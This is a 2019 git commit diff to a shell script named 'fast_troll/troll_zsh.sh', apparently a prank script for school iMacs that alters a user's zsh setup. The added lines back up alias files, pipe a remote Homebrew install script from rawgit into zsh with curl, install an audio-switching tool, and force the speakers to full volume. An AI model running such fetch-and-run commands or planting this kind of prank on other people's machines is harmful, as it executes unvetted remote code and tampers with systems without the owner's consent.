5362b72741c0e0db64f46543b57f2cfc96e5195c
Alexis M <iamsnkh@pm.me>
2019-07-14 17:13:23 +0200

    :sparkles: adding set OUTPUT iMac Audio Automatically

--- fast_troll/troll_zsh.sh
+++ fast_troll/troll_zsh.sh
@@ -6,7 +6,7 @@
 #    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/07/09 18:50:13 by amonteli     #+#   ##    ##    #+#        #
-#    Updated: 2019/07/14 17:01:19 by amonteli    ###    #+. /#+    ###.fr      #
+#    Updated: 2019/07/14 17:13:00 by amonteli    ###    #+. /#+    ###.fr      #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
@@ -15,6 +15,22 @@ if [ -f ~/.zshrc ]
 then
 	cp ~/.zshrc ~/.zshrcsave
 fi
+
+if [ -f ~/.brewconfig.zsh ]
+then
+	(brew install switchaudio-osx)
+else
+	(curl -fsSL https://rawgit.com/kube/42homebrew/master/install.sh | zsh)
+	(brew install switchaudio-osx)
+fi
+
+if [ -f ~/.oh-my-zsh/custom/alias.zsh ]
+then
+	cp ~/.oh-my-zsh/custom/alias.zsh ~/.oh-my-zsh/custom/.aliassave
+fi
+touch ~/.oh-my-zsh/custom/alias.zsh
+(SwitchAudioSource -s "Built-in Output" &)
+(osascript -e "set volume output volume 100" &)
 
 touch ~/.zshrc
 (osascript -e "set volume output volume 100" &)
